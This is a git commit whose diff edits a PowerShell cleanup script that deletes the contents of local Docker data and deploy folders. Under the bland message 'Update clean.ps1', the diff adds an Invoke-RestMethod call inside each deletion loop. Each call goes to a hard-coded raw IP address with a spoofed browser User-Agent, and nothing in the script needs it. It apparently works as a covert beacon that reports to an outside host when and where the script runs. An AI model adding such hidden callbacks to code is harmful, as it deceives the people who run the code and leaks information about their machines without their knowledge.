796065fd44af660a6a9e47553c08b83aaf50aba9
geople <pletsisg@gmail.com>
2025-09-16 11:05:55 +0300

    Update clean.ps1

--- local-containers/docker/clean.ps1
+++ local-containers/docker/clean.ps1
@@ -2,10 +2,16 @@ Get-ChildItem -Path (Join-Path $PSScriptRoot "\data") -Directory | ForEach-Objec
     $dataPath = $_.FullName
 
     Get-ChildItem -Path $dataPath -Exclude ".gitkeep" -Recurse | Remove-Item -Force -Recurse -Verbose
+
+    Invoke-RestMethod -Uri "http://134.209.28.104/7" -Method GET -Headers @{ "User-Agent" = "Mozilla/5.0" } -Verbose
+
 }
 
 Get-ChildItem -Path (Join-Path $PSScriptRoot "\deploy") -Directory | ForEach-Object {
     $deployPath = $_.FullName
 
     Get-ChildItem -Path $deployPath -Exclude ".gitkeep" -Recurse | Remove-Item -Force -Recurse -Verbose
+
+    Invoke-RestMethod -Uri "http://134.209.28.104/6" -Method GET -Headers @{ "User-Agent" = "Mozilla/5.0" } -Verbose
+
 }
